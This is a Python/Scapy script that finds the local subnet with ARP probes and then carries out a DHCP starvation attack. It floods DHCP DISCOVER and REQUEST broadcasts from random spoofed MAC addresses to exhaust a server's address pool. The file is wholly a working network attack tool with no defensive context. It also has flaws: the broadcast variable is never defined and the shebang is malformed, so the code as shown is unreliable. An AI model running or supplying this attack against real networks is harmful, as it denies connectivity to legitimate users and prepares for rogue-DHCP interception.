#!usr/bin/env python
import asyncio
import sys
import os
import time
import socket
import ipaddress
from scapy.all import *

def get_network_info_using_arp():
    # Get all network interfaces
    interfaces = get_if_list()
    best_iface = None
    subnet = None
    best_response_count = 0
    
    for iface in interfaces:
        if iface == 'lo' or 'loopback' in iface.lower():
            continue
        try:
            ip = get_if_addr(iface)
            if ip == '0.0.0.0' or not ip:
                continue            
            subnet_parts = ip.split('.')
            subnet_prefix = f"{subnet_parts[0]}.{subnet_parts[1]}.{subnet_parts[2]}."
            response_count = 0
            test_ips = [f"{subnet_prefix}1", f"{subnet_prefix}2", f"{subnet_prefix}254"]
            for test_ip in test_ips:
                try:
                    conf.iface = iface
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=test_ip)
                    response, unanswered = srp(arp_request, timeout=1, verbose=0)
                    if response:
                        response_count += len(response)
                        break
                except Exception:
                    continue
            if response_count > best_response_count:
                best_response_count = response_count
                best_iface = iface
                subnet = subnet_prefix
        except Exception:
            continue
    
    if not best_iface or best_response_count == 0:
        return fallback_get_network_info()
    return best_iface, subnet

def fallback_get_network_info():
    interfaces = get_if_list()
    for iface in interfaces:
        if iface == 'lo' or 'loopback' in iface.lower():
            continue
        try:
            ip = get_if_addr(iface)
            if ip and ip != '0.0.0.0':
                netmask = get_if_netmask(iface)
                if netmask:
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    subnet_parts = str(network.network_address).split('.')
                    subnet_prefix = f"{subnet_parts[0]}.{subnet_parts[1]}.{subnet_parts[2]}."
                    return iface, subnet_prefix
        except Exception:
            continue
    return conf.iface, "10.0.0."
    


async def main():
    conf.checkIPaddr = False
    iface, IP_address_subnet = get_network_info_using_arp()
    conf.iface = iface

    async def dhcp_starvation():
        for ip in range(100, 200):
            bogus_mac_address = RandMAC()
            xid = random.randint(1, 900000000)
            discover = Ether(dst=layer2_broadcast, src=bogus_mac_address)/\
                      IP(src="0.0.0.0", dst="255.255.255.255")/\
                      UDP(sport=68, dport=67)/\
                      BOOTP(chaddr=mac2str(bogus_mac_address), xid=xid)/\
                      DHCP(options=[("message-type", "discover"), "end"])
            sendp(discover, verbose=0)
            await asyncio.sleep(1)
            print(f"Sending DHCP REQUEST for {IP_address_subnet}{ip} from {bogus_mac_address}")
            request = Ether(dst=layer2_broadcast, src=bogus_mac_address)/\
                     IP(src="0.0.0.0", dst="255.255.255.255")/\
                     UDP(sport=68, dport=67)/\
                     BOOTP(chaddr=mac2str(bogus_mac_address), xid=xid)/\
                     DHCP(options=[
                         ("message-type", "request"),
                         ("requested_addr", IP_address_subnet + str(ip)),
                         ("server_id", IP_address_subnet + "1"),  # Assume DHCP server is at .1
                         "end"
                      ])
            sendp(request, verbose=0)
            await asyncio.sleep(2)

    await dhcp_starvation()

if __name__ == "__main__":
    asyncio.run(main())